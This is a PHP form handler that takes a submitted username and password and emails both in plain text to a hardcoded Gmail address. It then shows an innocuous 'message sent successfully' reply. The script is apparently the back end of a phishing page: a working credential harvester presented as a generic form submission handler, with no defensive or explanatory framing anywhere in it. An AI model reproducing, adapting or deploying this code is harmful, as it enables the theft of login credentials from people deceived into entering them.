<?php
if(isset($_POST['submit'])) {
    $to = "sea041598@gmail.com"; // Your email address
    $subject = "Form Submission"; // Email subject
    $username = $_POST['username']; // Get username from form
    $password = $_POST['password']; // Get password from form

    // Create email body
    $body = "Username: $username\nPassword: $password";

    // Set headers
    $headers = "From: sea041598@gmail.com\r\n";
    $headers .= "Reply-To: sea041598@gmail.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Send email
    if(mail($to, $subject, $body, $headers)) {
        // Show success message
        echo "Your message has been sent successfully.";
    } else {
        // Show error message
        echo "There was a problem sending your message. Please try again later.";
    }
}
?>
